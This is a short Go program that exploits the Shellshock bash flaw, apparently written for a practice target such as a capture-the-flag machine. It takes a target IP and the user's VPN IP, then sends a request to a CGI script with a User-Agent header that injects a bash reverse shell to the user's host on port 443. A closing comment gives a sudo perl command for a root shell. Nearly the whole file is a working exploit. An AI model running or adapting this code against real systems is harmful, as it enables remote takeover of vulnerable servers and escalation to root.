package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"strings"
)

func main() {
	getvalfromconsole := bufio.NewReader(os.Stdin)
	fmt.Printf("Emter Sense IP : ")
	ip, _ := getvalfromconsole.ReadString('\n')
	ip = strings.Replace(ip, "\n", "", -1)
	fmt.Printf("Emter Your(VPN) IP : ")
	vpnip, _ := getvalfromconsole.ReadString('\n')
	vpnip = strings.Replace(vpnip, "\n", "", -1)
	getshell(vpnip, ip)
}

func getshell(vpnip, shockerip string) {
	urlval := "http://SHELLSHOCKSERVER/cgi-bin/user.sh"
	urlval = strings.Replace(urlval, "SHELLSHOCKSERVER", shockerip, -1)

	shellshockstring := `() { :; };/bin/bash -i >& /dev/tcp/VPNIP/443 0>&1`
	shellshockstring = strings.Replace(shellshockstring, "VPNIP", vpnip, -1)
	fmt.Println(shellshockstring)
	fmt.Println(urlval)
	req, err := http.NewRequest("GET", urlval, nil)
	if err != nil {
		fmt.Println(err)
	}
	req.Header.Set("User-Agent", shellshockstring)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Println(err)
	}
	defer resp.Body.Close()

	//run this to get root sudo perl -e 'exec "/bin/bash"'
}
